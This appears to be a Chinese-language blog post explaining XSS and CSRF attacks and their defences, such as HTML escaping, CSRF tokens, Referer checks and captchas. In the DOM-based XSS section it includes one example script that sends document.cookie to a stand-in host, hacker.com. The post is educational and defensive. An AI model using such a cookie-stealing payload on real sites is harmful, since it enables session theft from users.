# XSS攻击与CSRF攻击 
2021-03-08
## XSS 跨站脚本攻击
跨站脚本攻击（Cross Site Scripting），缩写为XSS(原本应该叫CSS,but,you know...)。指的是攻击者往Web页面中插入恶意Script代码，当用户浏览该页时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。类似于SQL注入。

### 分类
1. 反射型
经过后端，不经过数据库。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS随响应内容一起返回给浏览器，最后浏览器解析执行XSS代码。
2. 存储型
经过后端，经过数据库。反射型XSS过程中后端服务器仅仅将XSS代码保存在内存中，并未持久化，因此每次触发反射性XSS都需要由用户输入相关的XSS代码；而存储型XSS则仅仅首次输入相关的XSS代码，保存在数据库中，当下次从数据库中获取该数据时会造成XSS。
3. DOM型
不经过后端，在前端浏览器触发,比如:
```js
div.innerHTML = "<script>$.get('[http://hacker.com?cookie='](http://hacker.com?cookie=')  + document.cookie)</script>"
```

### 如何预防
1. 不适用innerHTML, 改成innerText
2. 如果要使用innerHTML,采用HTML转义处理
```
把 > 替换成 &gt;
把 < 替换成 &lt;
把 & 替换成 &amp;
把 " 替换成 &quot;
把 ' 替换成 &#39;
```
3. 字符过滤
滤掉特殊的HTML标签，例如`<script>`、`<iframe>`等；过滤掉Javascript事件标签，例如"onclick"、"onfocus"等。

## CSRF
跨站点请求伪造（Cross-Site Request Forgery），缩写为CSRF。

### 攻击原理及过程
1. 用户打开浏览器，访问受信任网站A，输入用户名和密码请求登录A；
2. 用户信息通过验证后，网站A产生cookie信息并返回给浏览器，此时用户登录A网站成功，可以正常发请求到网站A；
3. 用户未退出A之前，在同一个浏览器打开一个tab页访问网站B；
4. 网站B接到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；
5. 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行。

### 预防
1. 验证HTTP Referer
根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。通过 Referer Check，可以检查请求是否来自合法的"源"。

HTTP Referer字段记录了HTTP请求的来源地址，后台可根据此字段控制请求来自于同一个网站，防止CSRF攻击。但是Referer是浏览器提供的，浏览器有漏洞时可能导致Referer被篡改

2. 在请求中添加token并验证
CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 cookie 中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的 cookie 来通过安全验证。

要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。

3. 验证码
从上述示例中可以看出，CSRF 攻击往往是在用户不知情的情况下构造了网络请求。而验证码会强制用户必须与应用进行交互，才能完成最终请求。因为通常情况下，验证码能够很好地遏制 CSRF 攻击。

但验证码并不是万能的，因为出于用户考虑，不能给网站所有的操作都加上验证码。因此，验证码只能作为防御 CSRF 的一种辅助手段，而不能作为最主要的解决方案。

## 总结
1. 防御 XSS 攻击
* HttpOnly 防止劫取 Cookie
* 用户的输入检查
* 服务端的输出检查
2. 防御 CSRF 攻击
* 验证码
* Referer Check
* Token 验证

## 参考链接
* [浅说 XSS 和 CSRF · Issue #68 · dwqs/blog](https://github.com/dwqs/blog/issues/68)
* [Web安全：XSS攻击和CSRF攻击 - 知乎](https://zhuanlan.zhihu.com/p/43059133)